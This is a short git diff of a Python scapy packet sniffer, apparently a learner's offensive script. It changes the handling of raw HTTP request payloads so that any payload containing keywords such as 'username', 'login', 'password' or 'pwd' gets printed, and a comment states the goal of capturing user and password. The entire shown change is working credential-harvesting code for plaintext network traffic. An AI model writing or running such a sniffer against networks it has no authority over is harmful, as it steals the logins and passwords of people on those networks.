@@ -13,8 +13,12 @@ def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load #make it a var and then check to see if it contains specific text
-            if "usr" or "username" in load:
-                print(load)
+            keywords = ["username", "user", "usr", "login", "password", "pass", "pwd", "pw"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+            #if "usr" or "username" in load:
+                #print(load)
             #print(packet[scapy.Raw].load) #print specific field, in this case user+pwd hopefully
             #print(packet.show) #packet.show will give field of packet
 
